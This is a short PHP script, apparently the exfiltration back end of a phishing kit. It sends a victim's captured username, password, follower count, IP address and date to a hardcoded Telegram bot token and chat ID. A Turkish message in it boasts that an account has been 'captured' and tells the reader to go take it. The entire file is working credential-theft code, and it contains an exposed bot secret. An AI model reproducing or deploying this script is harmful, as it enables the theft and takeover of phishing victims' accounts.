<?php
    $token='5000908961:AAGKTvzp49-Yc6YnQdh3MGBz5lOMrinan8E';
    $data = [
        'text' => ' 
        Sublime hesap düştü git çek ameke
Kullanıcı adı : '.$id.'
Şifre : '.$zwoup.'
takipçi : '.$takipci.'
ip : '.$ip.'
Tarih : '.$tarih.'
      ',
      'chat_id' =>-1001586201889
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>
